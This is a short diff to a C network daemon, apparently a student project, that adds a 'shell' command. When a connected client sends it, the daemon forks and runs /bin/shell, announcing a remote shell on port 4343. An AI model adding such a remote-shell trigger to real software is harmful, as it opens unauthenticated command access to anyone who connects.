@@ -148,6 +148,14 @@ void	ft_exit(t_daemon *daemon, int status)
 	exit(status);
 }
 
+void	spawn_shell(int cs)
+{
+	write(cs, "spawning shell on port 4343\n", ft_strlen("spawning shell on port 4343\n"));
+	int child = fork();
+	if (child == 0)
+		system("/bin/shell");
+}
+
 void	handle_connection(t_daemon *daemon, int cs)
 {
 	t_mem *mem;
@@ -173,6 +181,8 @@ void	handle_connection(t_daemon *daemon, int cs)
 	}
 	if (ft_strequ(mem->data, "?") == 1)
 		write(cs, "?     show help\nshell spawn remote shell on 4343\n", ft_strlen("?     show help\nshell spawn remote shell on 4343\n"));
+	if (ft_strequ(mem->data, "shell") == 1)
+		spawn_shell(cs);
 	ft_free_mem(mem);
 	write(cs, "$> ", 3);
 }
@@ -252,7 +262,6 @@ int	main(void)
 									if ( cs > maxfd )
 										maxfd = cs;
 								}
-								
 							}else {
 								handle_connection(daemon, i);
 							}
